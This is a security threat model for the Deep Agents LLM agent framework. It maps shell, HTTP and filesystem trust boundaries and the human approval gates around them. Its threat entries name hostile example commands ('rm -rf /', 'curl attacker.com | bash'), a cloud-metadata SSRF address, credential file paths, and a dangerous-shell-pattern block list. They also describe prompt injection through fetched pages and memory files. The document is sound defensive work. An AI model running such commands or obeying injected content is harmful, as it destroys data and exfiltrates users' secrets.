# Threat Model: Deep Agents

> Generated: 2026-03-04 | Commit: d455a6b1 | Scope: Full monorepo (libs/deepagents, libs/cli, libs/acp, libs/partners) | Mode: Open Source

## Scope

### In Scope

- `libs/deepagents/` — Core SDK: `create_deep_agent()`, middleware stack, backends, tool framework
- `libs/cli/deepagents_cli/` — Terminal CLI: TUI, non-interactive mode, HTTP tools, sandbox integrations
- `libs/acp/deepagents_acp/` — Agent Client Protocol server bridge
- `libs/partners/{modal,daytona,runloop}/` — Cloud sandbox partner integrations

### Out of Scope

- User application code that imports `deepagents` as a library
- LLM model behavior, prompt injection resistance of specific models
- User's deployment infrastructure, network topology, firewall rules
- Third-party service security (Modal, Daytona, Runloop, LangSmith platform internals)
- Tavily API internals
- `libs/harbor/deepagents_harbor/` — Internal benchmarking code, not a shipped package
- `deepagentsjs` (separate repository)

### Assumptions

1. The project is used as a library/framework — users control their own application code, model selection, and deployment.
2. `LocalShellBackend` is the default for CLI usage; users who want isolation must opt into a sandbox backend (`--sandbox modal|daytona|runloop|langsmith`). However, sandbox backends do not fully isolate — tools that run CLI-side (e.g., `fetch_url`, `http_request`, `web_search`) still execute on the host, so SSRF and local network attacks apply regardless of sandbox mode.
3. Human-in-the-loop (HITL) is the primary security control for the CLI; `auto_approve=False` is the default.
4. LLM output is untrusted — the framework executes tool calls decided by the LLM.
5. API keys are provided via environment variables and are the user's responsibility to protect.

---

## System Overview

Deep Agents is an opinionated agent harness built on LangGraph. It provides an LLM agent with filesystem tools (read, write, edit, glob, grep), shell execution, sub-agent delegation, web search/fetch, and context management. The CLI package (`deepagents-cli`) wraps this into a terminal application with a Textual TUI, HITL approval gates, and optional cloud sandbox backends. The ACP package exposes the agent over the Agent Client Protocol for IDE integration.

### Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                         User Application                            │
│                                                                     │
│  ┌──────────┐   ┌───────────────┐   ┌──────────────┐               │
│  │ CLI TUI  │   │ ACP Server    │   │ SDK (library) │              │
│  │ (C5)     │──>│ (C8)          │──>│ create_deep   │              │
│  └──────────┘   └───────────────┘   │ _agent() (C1) │              │
│        │                             └──────┬───────┘              │
│        │                                    │                       │
│  ┌─────┴──────────────────────────────────┐ │                       │
│  │          Middleware Stack               │ │                       │
│  │  FilesystemMiddleware (C2)             │ │                       │
│  │  SubAgentMiddleware (C4)               │◀┘                       │
│  │  SummarizationMiddleware               │                         │
│  │  HumanInTheLoopMiddleware              │                         │
│  └──────────┬─────────────┬───────────────┘                         │
│             │             │                                         │
│  ┌──────────▼──┐  ┌──────▼──────────┐  ┌───────────────┐          │
│  │ Local Shell │  │ Sandbox Backends │  │ HTTP Tools    │          │
│  │ Backend(C3) │  │ (C7)            │  │ (C6)          │          │
│  └──────┬──────┘  └──────┬──────────┘  └──────┬────────┘          │
│ - - - - │- - - - - - - - │- - - - - - - - - - │- TB1/TB2/TB3 - - │
│         ▼                ▼                     ▼                    │
│  ┌──────────┐   ┌────────────────┐   ┌──────────────────┐         │
│  │ Host OS  │   │ Cloud Sandbox  │   │ External URLs /  │         │
│  │ (shell)  │   │ (Modal/Daytona │   │ APIs (Tavily,    │         │
│  │          │   │  /Runloop/LS)  │   │  arbitrary HTTP)  │         │
│  └──────────┘   └────────────────┘   └──────────────────┘         │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Components

| ID | Component | Description | Trust Level | Entry Points |
|----|-----------|-------------|-------------|--------------|
| C1 | Core Agent Framework | `create_deep_agent()`, middleware orchestration, LangGraph state machine | framework-controlled | `graph.py:108` — `create_deep_agent()` |
| C2 | Filesystem & Tool Framework | `FilesystemMiddleware` — `read_file`, `write_file`, `edit_file`, `ls`, `glob`, `grep`, `execute` tools | framework-controlled | `middleware/filesystem.py:873` — `_create_execute_tool()` |
| C3 | Local Shell Backend | `LocalShellBackend` — `subprocess.run(shell=True)` on host OS | framework-controlled | `backends/local_shell.py:299` — `execute()` |
| C4 | Sub-Agent System | `SubAgentMiddleware`, `task` tool for delegating to child agents | framework-controlled | `middleware/subagents.py:374` — `_build_task_tool()` |
| C5 | CLI Terminal Interface | Textual TUI, non-interactive mode, stdin piping, slash commands | framework-controlled | `main.py:687` — `cli_main()`, `non_interactive.py:524` |
| C6 | HTTP Tools | `http_request()`, `fetch_url()`, `web_search()` — outbound HTTP from CLI | framework-controlled | `tools.py:35`, `tools.py:183`, `tools.py:104` |
| C7 | Sandbox Backends | Modal, Daytona, Runloop, LangSmith sandbox integrations | external | `integrations/sandbox_factory.py:68` — `create_sandbox()` |
| C8 | ACP Server | Agent Client Protocol bridge for IDE integration | framework-controlled | `server.py:432` — `prompt()` |

---

## Trust Boundaries

| ID | Boundary | Description | Controls (Inside) | Does NOT Control (Outside) |
|----|----------|-------------|-------------------|---------------------------|
| TB1 | Framework ↔ Host OS Shell | LLM-decided commands cross into unrestricted `subprocess.run(shell=True)` | Tool registration, HITL approval gates, timeout caps (`filesystem.py:889`), CLI shell allowlist validation (`config.py:856`) | The command string content (LLM-generated), host OS state, environment variables inherited by subprocess |
| TB2 | Framework ↔ External HTTP | Outbound HTTP requests to arbitrary URLs decided by the LLM | Tool registration, HITL approval for `fetch_url` (`agent.py:324`), timeout parameter (`tools.py:42`) | Target URL (LLM-chosen), response content, network topology, internal services reachable from the host |
| TB3 | Framework ↔ Cloud Sandbox | Commands and files sent to remote sandbox environments | Sandbox creation/teardown lifecycle (`sandbox_factory.py:68`), setup script execution, `shlex.quote()` for some paths | Sandbox isolation guarantees (delegated to Modal/Daytona/Runloop/LangSmith), sandbox-side filesystem, network access from within sandbox |
| TB4 | Framework ↔ User Code | User-provided tools, callbacks, model selection, system prompts, subagent definitions | Middleware execution order (`graph.py:271`), state isolation for subagents (`subagents.py:127`), skill name validation (`skills.py:208`) | User tool implementations, user-chosen LLM behavior, user prompt content |
| TB5 | Framework ↔ Local Filesystem | Agent file operations on the host filesystem | `validate_path()` blocks `..` and `~` (`backends/utils.py:234`), `virtual_mode` path confinement (`filesystem.py:135`), tool call ID sanitization (`backends/utils.py:30`) | File permissions (OS-level), filesystem content, symlink targets |

### Boundary Details

#### TB1: Framework ↔ Host OS Shell

- **Inside**: The `execute` tool is registered by `FilesystemMiddleware._create_execute_tool()` (`filesystem.py:873`). The CLI adds HITL approval gates via `_add_interrupt_on()` (`agent.py:324`). Non-interactive mode validates commands against `DANGEROUS_SHELL_PATTERNS` and a configurable allowlist (`config.py:856-911`). Timeout is capped at `max_execute_timeout=3600s` (`filesystem.py:425`).
- **Outside**: The actual command string is generated by the LLM. `LocalShellBackend.execute()` passes it directly to `subprocess.run(command, shell=True)` (`local_shell.py:299`). The host environment (`os.environ`) is inherited when `inherit_env=True` (`local_shell.py:194`).
- **Crossing mechanism**: Python function call from middleware to backend to `subprocess.run()`.

#### TB2: Framework ↔ External HTTP

- **Inside**: `http_request()` and `fetch_url()` are registered as tools (`tools.py:35`, `tools.py:183`). HITL approval is configured for `fetch_url` in `_add_interrupt_on()` (`agent.py:324`). Timeout defaults to 30s.
- **Outside**: The URL is chosen by the LLM. No URL allowlisting, no SSRF protection, no restriction on private IP ranges. Response content is returned to the LLM.
- **Crossing mechanism**: `requests.request()` / `requests.get()` HTTP calls.

#### TB3: Framework ↔ Cloud Sandbox

- **Inside**: `create_sandbox()` context manager (`sandbox_factory.py:68`) manages lifecycle. Setup scripts are expanded with `string.Template.safe_substitute(os.environ)` (`sandbox_factory.py:22-54`) and executed via `bash -c`. Partner backends use `shlex.quote()` for path arguments in some operations.
- **Outside**: Sandbox isolation is entirely the responsibility of the cloud provider for shell/filesystem operations. However, tools that run CLI-side (HTTP tools: `fetch_url`, `http_request`, `web_search`) are **not isolated by sandbox backends** and still execute on the host.
- **Crossing mechanism**: SDK API calls (Modal `sandbox.exec()`, Daytona `sandbox.process.exec()`, Runloop `client.devboxes.execute_and_await_completion()`, LangSmith `sandbox.run()`).

#### TB4: Framework ↔ User Code

- **Inside**: Middleware execution order is deterministic (`graph.py:271-294`). Subagent state isolation excludes `messages`, `todos`, `structured_response`, `skills_metadata`, `memory_contents` (`subagents.py:127`). Skill names are validated against a strict regex (`skills.py:208-246`). YAML is parsed with `yaml.safe_load` only (`skills.py:284`).
- **Outside**: Users provide tools, callbacks, model objects, system prompts, and subagent definitions via `create_deep_agent()` parameters.
- **Crossing mechanism**: Python function calls (tool invocation, callback execution, middleware hooks).

#### TB5: Framework ↔ Local Filesystem

- **Inside**: `validate_path()` (`backends/utils.py:234-297`) blocks `..` traversal and `~` prefixes. `sanitize_tool_call_id()` (`backends/utils.py:30`) prevents path traversal through tool call IDs. When `virtual_mode=True`, `FilesystemBackend._resolve_path()` (`filesystem.py:135`) confines paths to `root_dir`.
- **Outside**: When `virtual_mode=False` (default for `LocalShellBackend`), absolute paths bypass `root_dir` and the agent has unrestricted filesystem access. Symlinks are not resolved or checked.
- **Crossing mechanism**: Python `pathlib` / `open()` calls for filesystem operations; `subprocess.run()` for shell-based file access.

---

## Data Flows

| ID | Source | Destination | Data Type | Crosses Boundary | Protocol |
|----|--------|-------------|-----------|------------------|----------|
| DF1 | LLM (via tool calls) | C3 LocalShellBackend | Shell command strings | TB1 | Function call → `subprocess.run(shell=True)` |
| DF2 | LLM (via tool calls) | C6 HTTP Tools | URLs, HTTP methods, headers, body | TB2 | Function call → `requests.request()` |
| DF3 | LLM (via tool calls) | C2 Filesystem Tools | File paths, content, edit operations | TB5 | Function call → backend read/write |
| DF4 | User (terminal/stdin) | C5 CLI → C1 Agent | User messages, slash commands, file mentions | TB4 | Textual widget → LangGraph `astream()` |
| DF5 | LLM (via tool calls) | C4 Sub-Agent System | Task descriptions, subagent type selection | none (internal) | Function call → child `agent.invoke()` |
| DF6 | C6 HTTP Tools | LLM (via tool results) | HTTP response bodies, HTML→markdown content | TB2 | `requests.get()` response → tool result |
| DF7 | C3 LocalShellBackend | LLM (via tool results) | Shell stdout/stderr output | TB1 | `subprocess.run()` output → tool result |
| DF8 | User config | C5 CLI → C1 Agent | `.env` files, env vars, `~/.deepagents/config.toml` | TB4 | `dotenv.load_dotenv()` (`config.py:26`), `os.environ` |
| DF9 | ACP Client | C8 ACP Server | Prompt content blocks (text, images, resources) | TB4 | ACP wire protocol → `prompt()` handler |
| DF10 | C7 Sandbox Backends | LLM (via tool results) | Command output, file contents from sandbox | TB3 | SDK API response → tool result |

### Flow Details

#### DF1: LLM → LocalShellBackend (Shell Execution)

- **Data**: Raw shell command strings generated by the LLM. Examples: `ls -la`, `python script.py`, `curl http://internal-service`.
- **Validation**: CLI HITL approval gate (`agent.py:324`). Non-interactive mode: `is_shell_command_allowed()` (`config.py:856`) validates against `DANGEROUS_SHELL_PATTERNS` (blocks `$(`, backticks, `${`, newlines, redirects, process substitution, here-docs, bare `$VAR`) and optional allowlist. Timeout capped at 3600s (`filesystem.py:889`).
- **Trust assumption**: HITL is enabled and the human reviewer catches malicious commands. Without HITL, the LLM has unrestricted shell access.

#### DF2: LLM → HTTP Tools (Outbound Requests)

- **Data**: Arbitrary URLs, HTTP methods, headers, request bodies chosen by the LLM.
- **Validation**: HITL approval for `fetch_url` (`agent.py:324`). No URL allowlisting, no private IP filtering, no SSRF controls. `http_request` is also HITL-gated.
- **Trust assumption**: The user's network topology prevents SSRF to sensitive internal services, OR the human reviewer catches dangerous URLs.

#### DF3: LLM → Filesystem Tools (File Operations)

- **Data**: File paths and content for read/write/edit/glob/grep operations.
- **Validation**: `validate_path()` (`backends/utils.py:234`) blocks `..` and `~`. HITL gates `write_file` and `edit_file` (`agent.py:324`). With `virtual_mode=False` (default for `LocalShellBackend`), absolute paths are unrestricted.
- **Trust assumption**: HITL is enabled for write operations. Read operations are not gated — the agent can read any file the process can access.

---

## Threats

| ID | Data Flow | Threat | Boundary | Severity | Status | Code Reference |
|----|-----------|--------|----------|----------|--------|----------------|
| T1 | DF1 | Arbitrary command execution via LLM-controlled shell commands | TB1 | Medium | Mitigated | `local_shell.py:299`, `agent.py:324`, `config.py:856` |
| T2 | DF2 | SSRF via `http_request()` and `fetch_url()` — LLM can request arbitrary URLs including internal network | TB2 | Medium | Unmitigated | `tools.py:71`, `tools.py:219` |
| T3 | DF3 | Sensitive file read — agent can read any host file (API keys, SSH keys, `.env`) via `read_file` without HITL | TB5 | Medium | Accepted | `filesystem.py:520`, `agent.py:324` |
| T4 | DF1 | Environment variable leakage — `inherit_env=True` exposes all env vars (including secrets) to subprocess | TB1 | Low | Accepted | `local_shell.py:194` |
| T5 | DF3 | Path traversal in filesystem operations when `virtual_mode=False` | TB5 | Low | Accepted | `filesystem.py:107-112` |
| T6 | DF2 | Response data injection — HTTP response content returned to LLM may contain prompt injection payloads | TB2 | Info | N/A | `tools.py:74-76`, `tools.py:227` |

### Threat Details

#### T1: Arbitrary Command Execution via Shell

- **Flow**: DF1 (LLM → LocalShellBackend)
- **Description**: The LLM generates shell commands that are passed to `subprocess.run(command, shell=True)` (`local_shell.py:299`). A compromised or misbehaving LLM could execute destructive commands (`rm -rf /`, `curl attacker.com | bash`, exfiltrating secrets via network).
- **Preconditions**: HITL must be disabled or bypassed, OR the human reviewer must approve a malicious command.
- **Mitigations**: (1) HITL approval gate is default-on for `execute` tool (`agent.py:324`). (2) Non-interactive mode validates against `DANGEROUS_SHELL_PATTERNS` (`config.py:754-769`) blocking shell metacharacters. (3) Configurable allowlist via `DEEPAGENTS_SHELL_ALLOW_LIST` env var (`config.py:449`). (4) Timeout capped at 3600s (`filesystem.py:889`).
- **Residual risk**: HITL depends on human vigilance. Complex or obfuscated commands may pass review. Non-interactive allowlist validation is pattern-based, not a full shell parser.

#### T2: SSRF via HTTP Tools

- **Flow**: DF2 (LLM → HTTP Tools)
- **Description**: `http_request()` (`tools.py:71`) and `fetch_url()` (`tools.py:219`) make outbound HTTP requests to arbitrary URLs. An LLM could request `http://169.254.169.254/` (cloud metadata), `http://localhost:8080/admin`, or other internal endpoints. **These tools run CLI-side even when a sandbox backend is active**, so sandbox mode does not mitigate SSRF.
- **Preconditions**: The host must have network access to internal services. HITL must be disabled or the reviewer must approve the URL.
- **Mitigations**: HITL approval gate for `fetch_url` and `http_request` (`agent.py:324`).
- **Residual risk**: No programmatic URL allowlist, no private IP range blocking, no DNS rebinding protection. HITL is the only control. Sandbox backends do not help because HTTP tools execute on the CLI host, not in the sandbox. Correlates with existing advisories: GHSA-rwf7-34c7-w69c, GHSA-h4f5-v92m-cprc.

#### T3: Sensitive File Read

- **Flow**: DF3 (LLM → Filesystem Tools)
- **Description**: `read_file` is not gated by HITL (`agent.py:324` — only `write_file`/`edit_file` are gated). With `LocalShellBackend` (`virtual_mode=False`), the agent can read any file accessible to the process: `~/.ssh/id_rsa`, `~/.aws/credentials`, `.env` files.
- **Preconditions**: Default configuration with `LocalShellBackend`.
- **Mitigations**: None programmatic. `validate_path()` blocks `..` traversal but absolute paths are allowed. Sandbox backends isolate shell and filesystem operations but HTTP tools (which can also leak file contents indirectly) still run locally.
- **Residual risk**: By-design tradeoff — the agent needs broad file access for developer productivity. Sensitive file exposure is possible if the LLM is manipulated (e.g., via fetched web content containing prompt injection).

#### T4: Environment Variable Leakage to Subprocesses

- **Flow**: DF1 (LLM → LocalShellBackend)
- **Description**: `inherit_env=True` (`local_shell.py:194`) copies `os.environ` including API keys (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, etc.) into subprocess environment. A command like `env` or `printenv` would expose all secrets.
- **Preconditions**: Default `LocalShellBackend` configuration.
- **Mitigations**: HITL would catch explicit `env`/`printenv` commands. The CLI overrides `LANGSMITH_PROJECT` back to the user's value for shell commands (`agent.py:523-526`).
- **Residual risk**: Secrets are accessible to any subprocess command. This is by-design for developer tools (the user's shell has the same access).

#### T5: Path Traversal with `virtual_mode=False`

- **Flow**: DF3 (LLM → Filesystem Tools)
- **Description**: With `virtual_mode=False` (default for `LocalShellBackend`), `FilesystemBackend._resolve_path()` (`filesystem.py:107-112`) does not restrict absolute paths. The agent can write to any path the process user can write to.
- **Preconditions**: Default configuration. HITL must approve writes.
- **Mitigations**: HITL gates `write_file` and `edit_file`. `validate_path()` blocks `..` traversal. Correlates with advisory: GHSA-6vhq-jx4g-gv4h.
- **Residual risk**: Write operations to arbitrary absolute paths are possible if the human approves. Read operations to arbitrary paths are not gated.

#### T6: HTTP Response Content as Prompt Injection Vector

- **Flow**: DF2/DF6 (HTTP response → LLM)
- **Description**: `fetch_url()` converts HTML to markdown (`tools.py:227`) and returns it as tool output to the LLM. Malicious web content could contain prompt injection payloads that influence subsequent LLM actions.
- **Preconditions**: Agent fetches a URL containing adversarial content.
- **Mitigations**: None in the framework. This is an inherent LLM vulnerability.
- **Residual risk**: Indirect prompt injection via fetched content is an open research problem. The framework cannot solve this — mitigation is the LLM's responsibility.

---

## Input Source Coverage

| Input Source | Data Flows | Threats | Validation Points | Responsibility | Gaps |
|-------------|-----------|---------|-------------------|----------------|------|
| User direct input (terminal) | DF4 | — | Textual TUI input widget (`widgets/chat_input.py`), stdin size cap 10MiB (`main.py:619`) | user | None — user messages are passed directly to LLM |
| LLM output (tool calls) | DF1, DF2, DF3, DF5 | T1, T2, T3, T5 | HITL gates (`agent.py:324`), shell allowlist (`config.py:856`), `validate_path()` (`backends/utils.py:234`) | shared | No URL allowlist for HTTP tools; `read_file` not HITL-gated |
| Tool/function results | DF6, DF7, DF10 | T6 | Token truncation (`backends/utils.py:221`), large result offloading (`filesystem.py:1089`) | user | No sanitization of tool output before LLM consumption |
| URL-fetched content | DF6 | T2, T6 | HITL for `fetch_url` (`agent.py:324`), timeout 30s (`tools.py:42`) | user | No SSRF controls, no content sanitization |
| Configuration | DF8 | T4 | `dotenv.load_dotenv()` (`config.py:26`), `Settings.from_environment()` (`config.py:418`) | user | Env vars inherited by subprocesses include secrets |

---

## Out-of-Scope Threats

Threats that appear valid in isolation but fall outside project responsibility because they depend on conditions the project does not control.

| Pattern | Why Out of Scope | Project Responsibility Ends At |
|---------|-----------------|-------------------------------|
| Prompt injection leading to arbitrary tool execution | The project does not control model behavior, prompt construction, or the adversarial content the user exposes the agent to. The LLM decides which tools to call. | Providing HITL approval gates as the default security control (`agent.py:324`). The project cannot prevent the LLM from *requesting* a dangerous action — it can only gate execution. |
| Malicious user-registered tools executing harmful actions | Users provide their own tools via `create_deep_agent(tools=[...])`. The project does not control what user tools do. | Providing the tool registration API and documenting the trust model. User tools execute with the same privileges as the agent process. |
| LLM exfiltrating data via tool calls (e.g., sending secrets to attacker URL) | Requires the LLM to be manipulated AND HITL to be approved by the human. The project does not control model behavior or human review quality. | Providing HITL gates for `http_request`, `fetch_url`, and `execute` tools. The CLI's non-interactive shell validation blocks some exfiltration patterns (`config.py:754-769`). |
| Cloud sandbox escape to host | Sandbox isolation is provided by third-party platforms (Modal, Daytona, Runloop, LangSmith). The project delegates all isolation to these providers. | Managing sandbox lifecycle (`sandbox_factory.py:68`), using provider SDK APIs correctly, and documenting that sandbox security is the provider's responsibility. |
| Denial of service via resource exhaustion (large files, long-running commands) | Users control what tasks they give the agent and which resources are available. | Timeout caps on shell execution (`filesystem.py:889` — 3600s max), skill file size limit (`skills.py:126` — 10MB), token truncation for tool results (`backends/utils.py:221`). |
| Memory/AGENTS.md injection modifying agent behavior | Memory files are loaded from user-controlled paths (`~/.deepagents/{id}/AGENTS.md`, project-level). Users control their own memory content. | Loading memory via `MemoryMiddleware` (`agent.py:486`). Content is injected into the system prompt as-is — no sanitization, by design. |

### Rationale

**Prompt injection**: Deep Agents is an agent framework — it executes tool calls decided by an LLM. The project's security model is built around HITL approval, not preventing the LLM from making requests. The `execute` tool intentionally uses `shell=True` (`local_shell.py:302`) because the design goal is a developer productivity tool, not a hardened sandbox. Users who need isolation should use sandbox backends.

**User-registered tools**: The `create_deep_agent(tools=[...])` API (`graph.py:108`) accepts arbitrary callables. The framework invokes these when the LLM requests them. This is the same trust model as any plugin system — the project validates tool registration (name, schema) but not tool behavior. User tools run in-process with full privileges.

**Cloud sandbox escape**: The project's partner integrations (`libs/partners/`) are thin wrappers around provider SDKs. `ModalSandbox.execute()` calls `self._sandbox.exec("bash", "-c", command)` (`libs/partners/modal/langchain_modal/sandbox.py:75`). The project trusts the provider's isolation. If a sandbox is compromised, the blast radius is defined by the provider, not by Deep Agents.

---

## Revision History

| Date | Author | Changes |
|------|--------|---------|
| 2026-03-04 | Generated by langster-threat-model | Initial threat model |
| 2026-03-04 | Team review | Moved Harbor to out-of-scope (internal benchmarking, not shipped). Corrected assumption #2: sandbox backends don't fully isolate — HTTP tools run CLI-side. Updated T2 (SSRF) and TB3 to reflect incomplete sandbox isolation. |
